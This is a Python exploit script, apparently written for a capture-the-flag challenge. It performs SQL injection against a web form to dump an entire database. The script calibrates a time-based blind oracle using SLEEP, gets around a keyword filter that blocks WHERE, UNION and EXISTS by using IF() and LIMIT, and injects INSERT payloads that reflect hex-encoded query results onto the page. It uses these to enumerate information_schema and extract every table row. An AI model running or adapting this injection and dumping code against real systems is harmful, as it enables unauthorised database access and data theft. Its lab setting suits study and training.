#!/usr/bin/env python3
"""
sqli6.chal.deti:8035 — full appdb dump via the reflection channel.

Constraints honored (from the diagnostic):
  BLOCKED : EXISTS, WHERE, UNION, COUNT, MIN, IS NULL, FROM (derived)
  OK      : scalar subqueries, LIMIT n,1, GROUP_CONCAT, IF(), SLEEP(), HEX()
So: never a WHERE, never an EXISTS, filter via IF(...) in Python instead.
One row of a table = 1 POST (INSERT) + 1 GET (page render).
"""
import requests, time, re, uuid, statistics, sys

BASE   = "http://sqli6.chal.deti:8035"
SLEEP  = 0.30
THRESH = 0.15
S = requests.Session()
S.headers.update({"User-Agent": "sqli-dump-full/1.0"})
BASE_MS = 0.0
FLAG_RE = re.compile(r"[A-Za-z0-9_]{2,20}\{[^}\r\n]{3,150}\}")

# ---------- transport ----------
def _post(msg):
    t0 = time.perf_counter()
    try:
        S.post(BASE, data={"name": f"u{uuid.uuid4().hex[:8]}", "message": msg}, timeout=25)
        return time.perf_counter() - t0
    except Exception:
        return 25.0

def calibrate():
    global BASE_MS
    base  = statistics.median([_post("hi") for _ in range(7)])
    slept = statistics.median([_post(f"x'||SLEEP({SLEEP})||'y") for _ in range(3)])
    BASE_MS = base
    print(f"[*] baseline={base*1000:.0f}ms sleep={slept*1000:.0f}ms margin={(slept-base)*1000:.0f}ms")
    assert slept - base > THRESH, "oracle unstable"

# ---------- blind oracle (fallback only) ----------
def oracle(cond):
    return _post(f"x'||IF(({cond}),SLEEP({SLEEP}),0)||'y") > BASE_MS + THRESH

def get_int(expr, lo=0, hi=2**31):
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"({expr})>{mid}"): lo = mid + 1
        else:                          hi = mid
    return lo

def get_str(expr, max_len=200):
    L = get_int(f"CHAR_LENGTH(({expr}))", 0, max_len)
    out = []
    for i in range(1, L + 1):
        c = get_int(f"ASCII(SUBSTR(({expr}),{i},1))", 0, 256)
        out.append(chr(c) if 0 < c < 128 else "?")
        print(f"\r  {''.join(out)!r}", end="", flush=True)
    print()
    return "".join(out)

# ---------- reflection primitive ----------
def reflect_hex(expr):
    """INSERT HEX(expr) as a row and read it back from the page.
    None → INSERT failed (NULL expression, e.g. subquery returned no row)
    ''   → empty string result
    str  → decoded result"""
    marker = f"MK{uuid.uuid4().hex[:12]}"
    S.post(BASE, data={"name": "u",
                       "message": f"x'),('{marker}',HEX({expr})),('{marker}z','z')-- -"},
           timeout=25)
    html = S.get(BASE, timeout=25).text
    m = re.search(rf"<td>{marker}</td>\s*<td>([0-9A-Fa-f]*)</td>", html)
    if not m:
        return None
    return bytes.fromhex(m.group(1)).decode("utf-8", errors="replace")

# ---------- discovery ----------
def discover_tables():
    if reflect_hex("(SELECT GROUP_CONCAT(1))") != "1":
        return None
    raw = reflect_hex(
        "(SELECT GROUP_CONCAT(CONCAT(table_schema,'.',table_name)) "
        "FROM information_schema.tables)"
    )
    return [(s, n) for s, n in (p.split(".", 1) for p in (raw or "").split(",") if "." in p)]

def columns_of(table):
    # No WHERE — filter with IF(). Only appdb exists, so name collisions are moot.
    raw = reflect_hex(
        f"(SELECT GROUP_CONCAT(IF(table_name='{table}',column_name,NULL)) "
        f"FROM information_schema.columns)"
    )
    return [c for c in (raw or "").split(",") if c]

# ---------- dump ----------
SEP = "\x01"   # unlikely in text data, survives HEX round-trip cleanly

def dump_table(schema, table, cols):
    print(f"\n=== {schema}.{table} ===")
    print(f"  columns: {cols}")
    if not cols:
        print("  (no columns discovered)")
        return
    col_exprs = [f"IFNULL(`{c}`,'')" for c in cols]
    # Concatenate as "R\x01v1\x01v2..." so a missing row (NULL) is distinguishable
    # from a row whose values are all empty strings.
    concat = "CONCAT('R'" + "".join(f",CHAR(1),{e}" for e in col_exprs) + ")"

    n = 0
    while n < 100_000:
        r = reflect_hex(f"(SELECT {concat} FROM `{schema}`.`{table}` LIMIT {n},1)")
        if r is None or not r.startswith("R"):
            break
        vals = r[1:].split(SEP)[1:]
        vals += [""] * (len(cols) - len(vals))
        line = " | ".join(f"{c}={v}" for c, v in zip(cols, vals))
        print(f"  [{n:>4}] {line}")
        for v in vals:
            m = FLAG_RE.search(v)
            if m:
                print(f"         ^^^ flag candidate: {m.group(0)}")
        n += 1
    print(f"  ({n} rows)")

# ---------- main ----------
def main():
    calibrate()
    print(f"[+] version  : {get_str('SELECT @@version', 100)}")
    print(f"[+] database : {get_str('SELECT database()', 50)}")
    print(f"[+] user     : {get_str('SELECT current_user()', 100)}")

    pairs = discover_tables()
    if pairs is None:
        print("[-] GROUP_CONCAT unavailable — cannot enumerate cheaply")
        sys.exit(1)
    if not pairs:
        print("[-] no tables visible")
        sys.exit(1)

    appdb_tables = sorted(t for s, t in pairs if s == "appdb")
    print(f"\n[+] appdb tables ({len(appdb_tables)}): {appdb_tables}")

    for table in appdb_tables:
        cols = columns_of(table)
        dump_table("appdb", table, cols)

    print("\n[*] dump complete")

if __name__ == "__main__":
    main()
